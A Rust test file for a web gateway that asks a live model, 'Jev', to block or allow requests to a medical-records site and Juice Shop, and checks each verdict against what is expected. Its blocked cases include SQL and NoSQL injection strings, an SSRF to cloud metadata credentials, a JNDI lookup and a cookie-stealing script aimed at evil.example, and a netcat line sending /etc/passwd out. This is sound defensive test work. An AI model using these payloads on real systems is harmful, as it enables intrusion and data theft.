//! docs/04 section 4.4 "real Jev": the acceptance scenarios against the live
//! model. Ignored by default because it needs a key and the network:
//!
//! ```text
//! XSHIELD_JEV_ROUTE=direct XSHIELD_JEV_API_KEY=... \
//!   cargo test -p xshield-judge --test live_jev -- --ignored --nocapture
//! ```
//!
//! It prints one line per scenario and fails when any verdict differs from
//! the expectation, so the output is the misjudgement record.
//!
//! The function table (`function_cases_reach_jev_as_intended` and
//! `live_function_table`, at the end) sends the same 77 requests on four sites.
//! The first of them needs no key: a stub model checks that every request
//! reaches Jev with the `function` the table gives it.

#![allow(clippy::too_many_lines)]

use std::collections::BTreeMap;
use std::time::Duration;

use async_trait::async_trait;
use serde_json::{Value, json};
use xshield_core::context::{Attempt, DecisionPath, Outcome, SiteSpec};
use xshield_judge::context::ContextKey;
use xshield_judge::engine::{Judge, Judgement, Observation, RequestFacts};
use xshield_judge::jev::{JevClient, JevFailure, JevPort, TIMEOUT};

/// The gateway id of the origin responses the scenarios observe.
const RID: &str = "req_00000000000000000000000000000001";

/// One request of a table. The function table also says what the gateway must send Jev as `function`
/// (`function`), and how the verdict is judged (`status`).
#[derive(Clone, Copy, Debug)]
struct Case {
    name: &'static str,
    method: &'static str,
    path: &'static str,
    query: Option<&'static str>,
    body: &'static str,
    /// The credential, `None` for a request without one.
    session: Option<&'static str>,
    /// The verdict, `true` for a block. For a `KnownGap`, the verdict that is wanted.
    expect_block: bool,
    function: Function,
    status: Status,
    /// A path or query value the session has seen, which Jev must be shown as verified.
    seen: Option<&'static str>,
}

/// A request with the function the table gives it by default (`Unknown`) and a `Must` verdict.
fn call(
    method: &'static str,
    name: &'static str,
    path: &'static str,
    query: Option<&'static str>,
    body: &'static str,
    session: Option<&'static str>,
    expect_block: bool,
) -> Case {
    Case {
        name,
        method,
        path,
        query,
        body,
        session,
        expect_block,
        function: Function::Unknown,
        status: Status::Must,
        seen: None,
    }
}

fn get(
    name: &'static str,
    path: &'static str,
    query: Option<&'static str>,
    session: Option<&'static str>,
    expect_block: bool,
) -> Case {
    call("GET", name, path, query, "", session, expect_block)
}

fn post(
    name: &'static str,
    path: &'static str,
    body: &'static str,
    session: Option<&'static str>,
    expect_block: bool,
) -> Case {
    call("POST", name, path, None, body, session, expect_block)
}

fn site() -> SiteSpec {
    SiteSpec::from_json(
        r#"{"name":"emr","hosts":["emr.test"],"origin":"http://o:1","session":{"cookie":"SID"},
            "entries":["/login","/api/home","/api/patients","/api/share/redeem"],
            "bypass":["/static/*"],"mode":"enforce"}"#,
    )
    .expect("site")
}

/// Business traffic that must pass and attack variants that must not, on a
/// session that has only seen the patient list.
#[tokio::test]
#[ignore = "needs XSHIELD_JEV_API_KEY and network access"]
async fn live_business_traffic_and_evasions() {
    let judge = Judge::new(
        ContextKey::new(vec![4; 32]),
        JevClient::from_environment().expect("Jev configuration"),
    );
    let site = site();
    judge.observe(
        &site,
        &Observation {
            route: None,
            request_id: RID,
            unread: None,
            would_block: false,
            credential: Some("doctorA"),
            client: "10.0.0.1",
            issued_credential: None,
            method: "GET",
            path: "/api/patients",
            status: 200,
            content_type: Some("application/json"),
            body: br#"{"patients":[{"id":"7f3a91c2","name":"Zhang Wei","age":54}]}"#,
            now_ms: 1_000,
            sent: &[],
            echo: &[],
        },
    );
    let cases = [
        post(
            "new patient",
            "/api/patients",
            r#"{"name":"Chen Yu","birthday":"1990-04-12","phone":"13800138000","note":"首次就诊，主诉头痛三天"}"#,
            Some("doctorA"),
            false,
        ),
        post(
            "prescription",
            "/api/prescriptions",
            r#"{"patient_id":"7f3a91c2","drug":"Amlodipine 5mg","dose":"1 tablet daily","days":14}"#,
            Some("doctorA"),
            false,
        ),
        get(
            "paging",
            "/api/patients",
            Some("page=2&size=20&sort=name"),
            Some("doctorA"),
            false,
        ),
        get(
            "search chinese",
            "/api/patients",
            Some("q=%E5%BC%A0%E4%BC%9F"),
            Some("doctorA"),
            false,
        ),
        get(
            "date filter",
            "/api/appointments",
            Some("from=2025-01-01&to=2025-01-31&status=confirmed"),
            Some("doctorA"),
            false,
        ),
        post(
            "apostrophe name",
            "/api/notes",
            r#"{"title":"O'Brien follow-up","text":"Patient's wife called; don't reschedule."}"#,
            Some("doctorA"),
            false,
        ),
        post(
            "sql words in prose",
            "/api/notes",
            r#"{"title":"Please select the correct union rep","text":"Drop me a line to update the schedule."}"#,
            Some("doctorA"),
            false,
        ),
        post(
            "login",
            "/login",
            "username=dr.zhang&password=C0rrect-Horse-Battery",
            None,
            false,
        ),
        get(
            "seen id with sub path",
            "/api/patients/7f3a91c2/records",
            Some("type=lab"),
            Some("doctorA"),
            false,
        ),
        get(
            "blind sql",
            "/api/patients/7f3a91c2",
            Some("id=1%20AND%20SLEEP(5)"),
            Some("doctorA"),
            true,
        ),
        get(
            "sql comment bypass",
            "/api/patients",
            Some("q=admin%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%23"),
            Some("doctorA"),
            true,
        ),
        post(
            "nosql injection",
            "/login",
            r#"{"username":{"$ne":null},"password":{"$ne":null}}"#,
            None,
            true,
        ),
        post(
            "ssrf",
            "/api/import",
            r#"{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}"#,
            Some("doctorA"),
            true,
        ),
        post(
            "template injection",
            "/api/notes",
            r#"{"title":"{{7*7}}","text":"${jndi:ldap://evil.example/a}"}"#,
            Some("doctorA"),
            true,
        ),
        get(
            "backtick command",
            "/api/export",
            Some("file=report%60id%60.pdf"),
            Some("doctorA"),
            true,
        ),
        get(
            "idor numeric guess",
            "/api/patients/1002",
            None,
            Some("doctorA"),
            true,
        ),
        get(
            "idor via record id",
            "/api/records/99812",
            None,
            Some("doctorA"),
            true,
        ),
        post(
            "mass assignment role",
            "/api/profile",
            r#"{"display_name":"Zhang","role":"admin","owner_id":"other-doctor-9"}"#,
            Some("doctorA"),
            true,
        ),
    ];
    run(&judge, &site, &cases, 5_000).await;
}

#[tokio::test]
#[ignore = "needs XSHIELD_JEV_API_KEY and network access"]
async fn live_acceptance_scenarios() {
    let client = JevClient::from_environment().expect("Jev configuration");
    let judge = Judge::new(ContextKey::new(vec![3; 32]), client);
    let site = site();

    // Doctor A listed patients B and C; doctor B's patient D was never shown.
    let list = br#"{"patients":[{"id":"7f3a91c2","name":"Zhang Wei","age":54},{"id":"c04d55e8","name":"Li Na","age":31}]}"#;
    for session in ["doctorA", "doctorA2"] {
        judge.observe(
            &site,
            &Observation {
                route: None,
                request_id: RID,
                unread: None,
                would_block: false,
                credential: Some(session),
                client: "10.0.0.1",
                issued_credential: None,
                method: "GET",
                path: "/api/patients",
                status: 200,
                content_type: Some("application/json"),
                body: list,
                now_ms: 1_000,
                sent: &[],
                echo: &[],
            },
        );
    }
    // A share code redeemed by the recipient shows them patient A's record.
    judge.observe(
        &site,
        &Observation {
            route: None,
            request_id: RID,
            unread: None,
            would_block: false,
            credential: Some("recipient"),
            client: "10.0.0.1",
            issued_credential: None,
            method: "POST",
            path: "/api/share/redeem",
            status: 200,
            content_type: Some("application/json"),
            body: br#"{"patient":{"id":"a91be0d4","name":"Wang Fang"}}"#,
            now_ms: 1_100,
            sent: &[],
            echo: &[],
        },
    );

    let cases = [
        get(
            "A1 listed patient",
            "/api/patients/7f3a91c2",
            None,
            Some("doctorA"),
            false,
        ),
        get(
            "A2 other doctor's patient",
            "/api/patients/e5170b3a",
            None,
            Some("doctorA"),
            true,
        ),
        get(
            "A3 fresh session opens patient",
            "/api/patients/7f3a91c2",
            None,
            Some("stranger"),
            true,
        ),
        Case {
            name: "A4 delete unseen patient",
            method: "DELETE",
            path: "/api/patients/e5170b3a",
            query: None,
            body: "",
            session: Some("doctorA"),
            expect_block: true,
            function: Function::Unknown,
            status: Status::Must,
            seen: None,
        },
        get(
            "A5 foreign doctor parameter",
            "/api/patients",
            Some("doctor=other-doctor-9"),
            Some("doctorA"),
            true,
        ),
        get(
            "A6 shared patient after redeem",
            "/api/patients/a91be0d4",
            None,
            Some("recipient"),
            false,
        ),
        get(
            "A7 shared patient without redeem",
            "/api/patients/a91be0d4",
            None,
            Some("doctorA2"),
            true,
        ),
        post(
            "B1 chinese note",
            "/api/notes",
            r#"{"title":"复诊记录","text":"患者今日血压稳定，继续服药，两周后复查。"}"#,
            Some("doctorA"),
            false,
        ),
        post(
            "B1 english search",
            "/api/search",
            r#"{"q":"blood pressure follow up"}"#,
            Some("doctorA"),
            false,
        ),
        get(
            "B2 sql injection",
            "/api/patients/7f3a91c2",
            Some("q=1%27%20OR%20%271%27%3D%271%27%3B%20DROP%20TABLE%20patients--"),
            Some("doctorA"),
            true,
        ),
        get(
            "B2 union select",
            "/api/patients/7f3a91c2",
            Some("sort=name%20UNION%20SELECT%20password%20FROM%20users"),
            Some("doctorA"),
            true,
        ),
        post(
            "B2 command execution",
            "/api/notes",
            r#"{"title":"x","text":"; cat /etc/passwd | nc evil.example 4444"}"#,
            Some("doctorA"),
            true,
        ),
        get(
            "B2 path traversal",
            "/api/files",
            Some("name=..%2F..%2F..%2Fetc%2Fshadow"),
            Some("doctorA"),
            true,
        ),
        post(
            "B2 script injection",
            "/api/notes",
            r#"{"title":"<script>fetch('//evil.example/?c='+document.cookie)</script>","text":"hi"}"#,
            Some("doctorA"),
            true,
        ),
    ];
    run(&judge, &site, &cases, 2_000).await;
}

async fn run(judge: &Judge<JevClient>, site: &SiteSpec, cases: &[Case], start_ms: u64) {
    let mut wrong = Vec::new();
    for (index, case) in cases.iter().enumerate() {
        let request_id = format!("live{index}");
        let judgement = judge
            .judge(
                site,
                &RequestFacts {
                    route: None,
                    request_headers: &[],
                    method_overrides: &[],
                    request_id: &request_id,
                    method: case.method,
                    path: case.path,
                    query: case.query,
                    content_type: (!case.body.is_empty()).then_some("application/json"),
                    body: case.body.as_bytes(),
                    credential: case.session,
                    client: "10.0.0.1",
                    now_ms: start_ms + u64::try_from(index).unwrap_or(0),
                },
            )
            .await;
        let record = judgement.record;
        let blocked = !judgement.forward;
        let detail = record.jev.as_ref().map_or_else(
            || "no model call".to_owned(),
            |jev| {
                format!(
                    "{}ms access={:?} attack={:?} failure={:?}",
                    jev.millis, jev.access, jev.attack, jev.failure
                )
            },
        );
        println!(
            "{:<34} blocked={:<5} expected={:<5} {:?}/{:?}  {}",
            case.name, blocked, case.expect_block, record.decision_path, record.outcome, detail
        );
        if blocked != case.expect_block {
            if let Some(jev) = &record.jev {
                println!("  state sent: {}", jev.state.as_deref().unwrap_or("none"));
            }
            wrong.push(case.name);
        }
        assert!(
            record.decision_path != DecisionPath::JevUnavailable
                || record.outcome != Outcome::Unjudged,
            "the live provider must answer"
        );
    }
    assert!(
        wrong.is_empty(),
        "verdicts differ from the expectation: {wrong:?}"
    );
}

/// The Juice Shop checkout flow recorded on the Windows trial (docs/04 section
/// 4.5): camel-case route names, small numeric ids and card fields that the
/// first trial answered DENY for although every id had been shown. The
/// checkout POST is covered too: `paymentId` 7 was shown only as a card id.
#[tokio::test]
#[ignore = "needs XSHIELD_JEV_API_KEY and network access"]
async fn live_juice_shop_checkout_flow() {
    let judge = Judge::new(
        ContextKey::new(vec![5; 32]),
        JevClient::from_environment().expect("Jev configuration"),
    );
    let site = SiteSpec::from_json(
        r#"{"name":"juice","hosts":["juice.test"],"origin":"http://o:1","session":{"cookie":"token"},
            "entries":["/","/rest/user/login","/rest/products/search"],
            "bypass":["/assets/*"],"mode":"enforce"}"#,
    )
    .expect("site");
    let observe = |path: &'static str, body: &'static [u8], now_ms: u64| {
        judge.observe(
            &site,
            &Observation {
                route: None,
                request_id: RID,
                unread: None,
                would_block: false,
                credential: Some("tokenA"),
                client: "10.0.0.1",
                issued_credential: None,
                method: "GET",
                path,
                status: 200,
                content_type: Some("application/json"),
                body,
                now_ms,
                sent: &[],
                echo: &[],
            },
        );
    };
    observe(
        "/rest/basket/22",
        br#"{"status":"success","data":{"id":22,"coupon":null,"UserId":24,"Products":[{"id":1,"name":"Apple Juice (1000ml)","price":1.99,"BasketItem":{"id":9,"quantity":1,"BasketId":22,"ProductId":1}}]}}"#,
        1_000,
    );
    observe(
        "/rest/products/search",
        br#"{"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","price":1.99},{"id":2,"name":"Orange Juice (1000ml)","price":2.99}]}"#,
        999,
    );
    observe(
        "/api/Quantitys/",
        br#"{"status":"success","data":[{"ProductId":1,"id":1,"quantity":138},{"ProductId":2,"id":2,"quantity":8}]}"#,
        1_001,
    );
    observe(
        "/api/Addresss",
        br#"{"status":"success","data":[{"id":7,"fullName":"Test User","zipCode":"10001","city":"NYC","UserId":24}]}"#,
        1_002,
    );
    observe(
        "/api/Deliverys",
        br#"{"status":"success","data":[{"id":1,"name":"One Day Delivery","price":0.99,"eta":1},{"id":2,"name":"Fast Delivery","price":0.5,"eta":3}]}"#,
        1_003,
    );
    observe(
        "/api/Cards",
        br#"{"status":"success","data":[{"id":7,"fullName":"Test User","cardNum":4111111111111111}]}"#,
        1_004,
    );
    let cases = [
        get(
            "address by shown id",
            "/api/Addresss/7",
            None,
            Some("tokenA"),
            false,
        ),
        get(
            "delivery by shown id",
            "/api/Deliverys/1",
            None,
            Some("tokenA"),
            false,
        ),
        get(
            "card by shown id",
            "/api/Cards/7",
            None,
            Some("tokenA"),
            false,
        ),
        get(
            "basket item by shown id",
            "/api/BasketItems/9",
            None,
            Some("tokenA"),
            false,
        ),
        post(
            "add card form",
            "/api/Cards/",
            r#"{"fullName":"Test User","cardNum":4111111111111111,"expMonth":2,"expYear":2099}"#,
            Some("tokenA"),
            false,
        ),
        get("address list", "/api/Addresss", None, Some("tokenA"), false),
        get(
            "delivery list",
            "/api/Deliverys",
            None,
            Some("tokenA"),
            false,
        ),
        get("card list", "/api/Cards", None, Some("tokenA"), false),
        get(
            "quantity list",
            "/api/Quantitys/",
            None,
            Some("tokenA"),
            false,
        ),
        get(
            "product by shown id",
            "/api/Products/1",
            Some("d=Sun%20Nov%2001%202026"),
            Some("tokenA"),
            false,
        ),
        post(
            "add to own basket",
            "/api/BasketItems/",
            r#"{"ProductId":1,"BasketId":"22","quantity":1}"#,
            Some("tokenA"),
            false,
        ),
        post(
            "add to someone else's basket",
            "/api/BasketItems/",
            r#"{"ProductId":1,"BasketId":"1","quantity":1}"#,
            Some("tokenA"),
            true,
        ),
        get(
            "user by name never shown",
            "/api/users/Alice",
            None,
            Some("tokenA"),
            true,
        ),
        post(
            "neutral key names another account",
            "/rest/wallet/transfer",
            r#"{"to":"user-1042","amount":5}"#,
            Some("tokenA"),
            true,
        ),
        get(
            "basket of someone else",
            "/rest/basket/1",
            None,
            Some("tokenA"),
            true,
        ),
        get(
            "address never shown",
            "/api/Addresss/3",
            None,
            Some("tokenA"),
            true,
        ),
        get(
            "card never shown",
            "/api/Cards/12",
            None,
            Some("tokenA"),
            true,
        ),
        post(
            "checkout own basket",
            "/rest/basket/22/checkout",
            r#"{"couponData":"bnVsbA==","orderDetails":{"paymentId":"7","addressId":"7","deliveryMethodId":"1"}}"#,
            Some("tokenA"),
            false,
        ),
        post(
            "checkout foreign basket",
            "/rest/basket/1/checkout",
            r#"{"couponData":"bnVsbA==","orderDetails":{"paymentId":"7","addressId":"7","deliveryMethodId":"1"}}"#,
            Some("tokenA"),
            true,
        ),
    ];
    run(&judge, &site, &cases, 2_000).await;
}

/// The Juice Shop sign-up flow: a client without a session is shown the
/// security questions and the id of the user it just created, then answers
/// with both. The first third Windows round judged that DENY.
#[tokio::test]
#[ignore = "needs XSHIELD_JEV_API_KEY and network access"]
async fn live_juice_shop_sign_up_flow() {
    let judge = Judge::new(
        ContextKey::new(vec![6; 32]),
        JevClient::from_environment().expect("Jev configuration"),
    );
    let site = SiteSpec::from_json(
        r#"{"name":"juice","hosts":["juice.test"],"origin":"http://o:1","session":{"cookie":"token"},
            "entries":["/","/rest/user/login","/api/Users/","/api/SecurityQuestions/","/api/SecurityAnswers/"],
            "bypass":["/assets/*"],"mode":"enforce"}"#,
    )
    .expect("site");
    for (method, path, body, now_ms) in [
        (
            "GET",
            "/api/SecurityQuestions/",
            br#"{"status":"success","data":[{"id":1,"question":"Your eldest siblings middle name?"},{"id":2,"question":"Mother's maiden name?"}]}"#.as_slice(),
            1_000,
        ),
        (
            "POST",
            "/api/Users/",
            br#"{"status":"success","data":{"id":52,"email":"new.user@example.com","role":"customer","isActive":true}}"#.as_slice(),
            1_001,
        ),
    ] {
        judge.observe(
            &site,
            &Observation { route: None, request_id: RID, unread: None, would_block: false,
                credential: None,
                client: "10.0.0.1",
                issued_credential: None,
                method,
                path,
                status: 200,
                content_type: Some("application/json"),
                body,
                now_ms,
                sent: &[],
                echo: &[],
            },
        );
    }
    let cases = [
        post(
            "answer for the user just created",
            "/api/SecurityAnswers/",
            r#"{"UserId":52,"answer":"iYPJ_o3lz87lCk1v8arjsUK1","SecurityQuestionId":1}"#,
            None,
            false,
        ),
        post(
            "answer for someone else's user",
            "/api/SecurityAnswers/",
            r#"{"UserId":1,"answer":"iYPJ_o3lz87lCk1v8arjsUK1","SecurityQuestionId":1}"#,
            None,
            true,
        ),
    ];
    run(&judge, &site, &cases, 2_000).await;
}

// The function table (docs/07 section 7.9.18). The 75 requests of the probe that asked the model about
// layers 2 and 3 (`designs/function-level-authz-probe/jev_probe.py`), and two that are only recorded, are
// sent through `Judge` to four sites that declare their functions.

const DOCTOR: &str = "doctorA";
const SHOPPER: &str = "shopper";
const ADMIN: &str = "adminA";

/// The known functions of the emr sites: the probe's `emr-base`.
const EMR_FUNCTIONS: &str = r#"{"key":"GET /login","source":"rule"},
    {"key":"POST /login","source":"rule"},
    {"key":"GET /api/home","source":"rule"},
    {"key":"GET /api/patients","source":"rule"},
    {"key":"POST /api/patients","source":"rule"},
    {"key":"GET /api/patients/{id}","source":"rule"},
    {"key":"GET /api/patients/{id}/notes","source":"rule"}"#;

/// The administrator-only functions of `emr-admin` and `emr-role`.
const ADMIN_FUNCTIONS: &str = r#"{"key":"POST /api/admin/export","source":"rule","tier":"admin","reliability":"high"},
    {"key":"GET /api/audit-logs","source":"rule","tier":"admin","reliability":"high"},
    {"key":"PUT /api/staff/{id}/role","source":"rule","tier":"admin","reliability":"high"},
    {"key":"GET /api/settings/clinic","source":"rule","tier":"admin","reliability":"high"}"#;

/// The known functions of the shop.
const SHOP_FUNCTIONS: &str = r#"{"key":"POST /rest/user/login","source":"rule"},
    {"key":"GET /rest/user/whoami","source":"rule"},
    {"key":"GET /rest/products/search","source":"rule"},
    {"key":"GET /api/BasketItems","source":"rule"},
    {"key":"GET /rest/basket/{id}","source":"rule"},
    {"key":"GET /rest/order-history","source":"rule"}"#;

/// The four sites. `Base`, `Admin` and `Role` are emr sites, and each has its own sessions because a
/// session is keyed by its site's name.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Site {
    /// The known functions only, and `ask_unknown_functions`.
    Base,
    /// `Base` with the administrator-only functions.
    Admin,
    /// `Admin` with the role declared by the home page, so that an administrator's session exists.
    Role,
    /// The shop.
    Shop,
}

struct Fixture {
    base: SiteSpec,
    admin: SiteSpec,
    role: SiteSpec,
    shop: SiteSpec,
}

impl Fixture {
    fn site(&self, site: Site) -> &SiteSpec {
        match site {
            Site::Base => &self.base,
            Site::Admin => &self.admin,
            Site::Role => &self.role,
            Site::Shop => &self.shop,
        }
    }
}

fn site_spec(name: &str, entries: &str, objects: &str) -> SiteSpec {
    SiteSpec::from_json(&format!(
        r#"{{"name":"{name}","hosts":["{name}.test"],"origin":"http://o:1","session":{{"cookie":"SID"}},"entries":[{entries}],"mode":"enforce","objects":{objects}}}"#
    ))
    .expect("the table's site is valid")
}

fn fixture() -> Fixture {
    let emr = r#""/login","/api/home","/api/patients""#;
    let asking =
        |functions: &str| format!(r#"{{"ask_unknown_functions":true,"functions":[{functions}]}}"#);
    // The home page declares the doctor and the role, so an administrator's session is one that says so.
    let identity = format!(
        r#"{{"classes":[{{"id":"doctor","name":"医生"}},{{"id":"staff","name":"员工"}}],
            "slots":[{{"key":"GET /api/home doctor.id","class":"doctor","source":"admin","identity":"user"}},
                     {{"key":"GET /api/home role","class":"staff","source":"admin","identity":"role"}}],
            "ask_unknown_functions":true,"functions":[{EMR_FUNCTIONS},{ADMIN_FUNCTIONS}]}}"#
    );
    Fixture {
        base: site_spec("emr-base", emr, &asking(EMR_FUNCTIONS)),
        admin: site_spec(
            "emr-admin",
            emr,
            &asking(&format!("{EMR_FUNCTIONS},{ADMIN_FUNCTIONS}")),
        ),
        role: site_spec("emr-role", emr, &identity),
        shop: site_spec(
            "shop",
            r#""/rest/user/login","/rest/user/whoami""#,
            &asking(SHOP_FUNCTIONS),
        ),
    }
}

/// What the gateway must send Jev as `state.request.function`.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Function {
    /// `{"known":false}`: the table does not list the request's function.
    Unknown,
    /// `{"tier":"admin","attempt":"over_privilege"}`: an administrator-only function, reached by a session
    /// that is not an administrator's.
    Attempt,
    /// No `function` field: the table knows the function, or it decides nothing about it.
    None,
}

/// How a request's verdict is judged.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Status {
    /// The verdict must match `expect_block`.
    Must,
    /// Known not to match today. It is printed, and it never fails the test.
    KnownGap,
    /// Only printed: the question is what the model answers.
    Observe,
}

impl Case {
    /// The table knows this request's function, so Jev is shown none.
    fn known(self) -> Self {
        Self {
            function: Function::None,
            ..self
        }
    }

    /// An administrator-only function that this session may not reach.
    fn attempt(self) -> Self {
        Self {
            function: Function::Attempt,
            ..self
        }
    }

    fn known_gap(self) -> Self {
        Self {
            status: Status::KnownGap,
            ..self
        }
    }

    fn observe(self) -> Self {
        Self {
            status: Status::Observe,
            ..self
        }
    }

    fn seen(self, value: &'static str) -> Self {
        Self {
            seen: Some(value),
            ..self
        }
    }
}

/// The emr-base requests: the 30 of layers 3 and the controls, then the 28 held ones that are not the
/// shop's.
fn base_cases() -> Vec<Case> {
    vec![
        // Layer 3: functions outside the table that must not be reached.
        get("GET /metrics", "/metrics", None, Some(DOCTOR), true),
        get(
            "GET /actuator/env",
            "/actuator/env",
            None,
            Some(DOCTOR),
            true,
        ),
        get(
            "GET /api/admin/export",
            "/api/admin/export",
            None,
            Some(DOCTOR),
            true,
        ),
        get("GET /admin/users", "/admin/users", None, Some(DOCTOR), true),
        get("GET /ftp/", "/ftp/", None, Some(DOCTOR), true),
        get("GET /debug/vars", "/debug/vars", None, Some(DOCTOR), true),
        get(
            "GET /api/internal/config",
            "/api/internal/config",
            None,
            Some(DOCTOR),
            true,
        ),
        get(
            "GET /swagger-ui/index.html",
            "/swagger-ui/index.html",
            None,
            Some(DOCTOR),
            true,
        ),
        get(
            "GET /server-status",
            "/server-status",
            None,
            Some(DOCTOR),
            true,
        ),
        // `{id}` in the table covers this route word, so the function is known and none is sent.
        get(
            "GET /api/patients/export-all",
            "/api/patients/export-all",
            None,
            Some(DOCTOR),
            true,
        )
        .known(),
        call(
            "DELETE",
            "DELETE /api/patients (bulk)",
            "/api/patients",
            None,
            "",
            Some(DOCTOR),
            true,
        ),
        // The probe marked 7005 verified by hand. The gateway does not: no position of this route is a
        // patient, so the value is shown as seen, not verified. The same holds for the impersonation below
        // and for the emr-admin case of this value.
        call(
            "PUT",
            "PUT /api/staff/{id}/role, own verified id",
            "/api/staff/7005/role",
            None,
            r#"{"role":"admin"}"#,
            Some(DOCTOR),
            true,
        ),
        get(
            "GET /infrastructure/backup",
            "/infrastructure/backup",
            None,
            Some(DOCTOR),
            true,
        ),
        // Layer 3: ordinary functions that are new to the table and must pass.
        get(
            "GET /api/v2/coupons",
            "/api/v2/coupons",
            None,
            Some(DOCTOR),
            false,
        ),
        get(
            "GET /api/notifications/unread",
            "/api/notifications/unread",
            None,
            Some(DOCTOR),
            false,
        ),
        get(
            "GET /api/appointments/today",
            "/api/appointments/today",
            None,
            Some(DOCTOR),
            false,
        ),
        get(
            "GET /api/profile/settings",
            "/api/profile/settings",
            None,
            Some(DOCTOR),
            false,
        ),
        get("GET /help/faq", "/help/faq", None, Some(DOCTOR), false),
        get(
            "GET /api/dashboard/summary",
            "/api/dashboard/summary",
            None,
            Some(DOCTOR),
            false,
        ),
        get(
            "GET /api/departments",
            "/api/departments",
            None,
            Some(DOCTOR),
            false,
        ),
        get(
            "GET /api/patients/{id}/timeline, verified id",
            "/api/patients/7005/timeline",
            None,
            Some(DOCTOR),
            false,
        )
        .seen("7005"),
        post(
            "POST /api/feedback with text",
            "/api/feedback",
            r#"{"message":"预约页面加载有点慢"}"#,
            Some(DOCTOR),
            false,
        ),
        get(
            "GET /api/reports/monthly",
            "/api/reports/monthly",
            None,
            Some(DOCTOR),
            false,
        ),
        post(
            "POST /api/patients/{id}/prescriptions, verified id",
            "/api/patients/7005/prescriptions",
            r#"{"drug":"amoxicillin","dose":"500mg"}"#,
            Some(DOCTOR),
            false,
        )
        .seen("7005"),
        get(
            "GET /chunk-5f3a9c.js",
            "/chunk-5f3a9c.js",
            None,
            Some(DOCTOR),
            false,
        ),
        // Controls: no `function` is sent, and the answers must not move with the new instruction.
        get(
            "GET /api/patients/7006 never shown",
            "/api/patients/7006",
            None,
            Some(DOCTOR),
            true,
        )
        .known(),
        get(
            "GET /api/patients/7005 verified",
            "/api/patients/7005",
            None,
            Some(DOCTOR),
            false,
        )
        .known()
        .seen("7005"),
        get(
            "entry search with text",
            "/api/patients",
            Some("q=%E5%BC%A0%E4%BC%9F"),
            Some(DOCTOR),
            false,
        )
        .known(),
        post(
            "login form",
            "/login",
            r#"{"username":"doctor_a","password":"not-a-real-password"}"#,
            None,
            false,
        )
        .known(),
        post(
            "new patient form",
            "/api/patients",
            r#"{"name":"Li Na","age":41}"#,
            Some(DOCTOR),
            false,
        )
        .known(),
        // Held: the probe's deny cases, which must be blocked.
        get(
            "GET /management/heapdump",
            "/management/heapdump",
            None,
            Some(DOCTOR),
            true,
        ),
        get("GET /.env", "/.env", None, Some(DOCTOR), true),
        get("GET /.git/config", "/.git/config", None, Some(DOCTOR), true),
        get(
            "GET /api/v1/system/logs",
            "/api/v1/system/logs",
            None,
            Some(DOCTOR),
            true,
        ),
        post(
            "POST /api/maintenance/reindex",
            "/api/maintenance/reindex",
            "",
            Some(DOCTOR),
            true,
        ),
        get("GET /wp-admin/", "/wp-admin/", None, Some(DOCTOR), true),
        get(
            "GET /jolokia/list",
            "/jolokia/list",
            None,
            Some(DOCTOR),
            true,
        ),
        get("GET /h2-console", "/h2-console", None, Some(DOCTOR), true),
        get("GET /backup.sql", "/backup.sql", None, Some(DOCTOR), true),
        call(
            "DELETE",
            "DELETE /api/users/all",
            "/api/users/all",
            None,
            "",
            Some(DOCTOR),
            true,
        ),
        post(
            "POST /api/users/{id}/impersonate, verified id",
            "/api/users/7005/impersonate",
            "",
            Some(DOCTOR),
            true,
        ),
        get(
            "GET /api/accounts/all",
            "/api/accounts/all",
            None,
            Some(DOCTOR),
            true,
        ),
        get("GET /trace", "/trace", None, Some(DOCTOR), true).known_gap(),
        get(
            "GET /api/tenants/list-all",
            "/api/tenants/list-all",
            None,
            Some(DOCTOR),
            true,
        ),
        post(
            "POST /api/permissions/grant",
            "/api/permissions/grant",
            r#"{"permission":"billing_write"}"#,
            Some(DOCTOR),
            true,
        ),
        // Held: the probe's allow cases, which must pass.
        get(
            "GET /api/messages/inbox",
            "/api/messages/inbox",
            None,
            Some(DOCTOR),
            false,
        ),
        get(
            "GET /api/schedule/week",
            "/api/schedule/week",
            None,
            Some(DOCTOR),
            false,
        ),
        post(
            "POST /api/patients/{id}/notes, verified id",
            "/api/patients/7005/notes",
            r#"{"text":"复诊，血压正常"}"#,
            Some(DOCTOR),
            false,
        )
        .seen("7005"),
        get(
            "GET /api/lab-results/recent",
            "/api/lab-results/recent",
            None,
            Some(DOCTOR),
            false,
        ),
        get(
            "GET /favicon.ico",
            "/favicon.ico",
            None,
            Some(DOCTOR),
            false,
        ),
        get(
            "GET /api/i18n/zh-CN",
            "/api/i18n/zh-CN",
            None,
            Some(DOCTOR),
            false,
        ),
        get(
            "GET /api/me/preferences",
            "/api/me/preferences",
            None,
            Some(DOCTOR),
            false,
        ),
        call(
            "PUT",
            "PUT /api/me/password",
            "/api/me/password",
            None,
            r#"{"new_password":"not-a-real-password"}"#,
            Some(DOCTOR),
            false,
        ),
        get(
            "GET /api/pharmacy/drugs",
            "/api/pharmacy/drugs",
            None,
            Some(DOCTOR),
            false,
        ),
        get(
            "GET /api/config/ui",
            "/api/config/ui",
            None,
            Some(DOCTOR),
            false,
        )
        .known_gap(),
        get(
            "GET /api/patients/{id}/export-pdf, verified id",
            "/api/patients/7005/export-pdf",
            None,
            Some(DOCTOR),
            false,
        )
        .seen("7005"),
        post("POST /api/logout", "/api/logout", "", Some(DOCTOR), false),
        get(
            "GET /api/wards/occupancy",
            "/api/wards/occupancy",
            None,
            Some(DOCTOR),
            false,
        ),
    ]
}

/// The emr-admin requests: the four layer 2 attempts, by a session that is not an administrator's.
fn admin_cases() -> Vec<Case> {
    vec![
        post(
            "POST /api/admin/export",
            "/api/admin/export",
            "",
            Some(DOCTOR),
            true,
        )
        .attempt(),
        get(
            "GET /api/audit-logs",
            "/api/audit-logs",
            None,
            Some(DOCTOR),
            true,
        )
        .attempt(),
        call(
            "PUT",
            "PUT /api/staff/{id}/role, own verified id",
            "/api/staff/7005/role",
            None,
            r#"{"role":"admin"}"#,
            Some(DOCTOR),
            true,
        )
        .attempt(),
        get(
            "GET /api/settings/clinic (plain name)",
            "/api/settings/clinic",
            None,
            Some(DOCTOR),
            true,
        )
        .attempt(),
    ]
}

/// The emr-role requests: the two recorded questions, by an administrator's session. They are only
/// printed.
fn role_cases() -> Vec<Case> {
    vec![
        get(
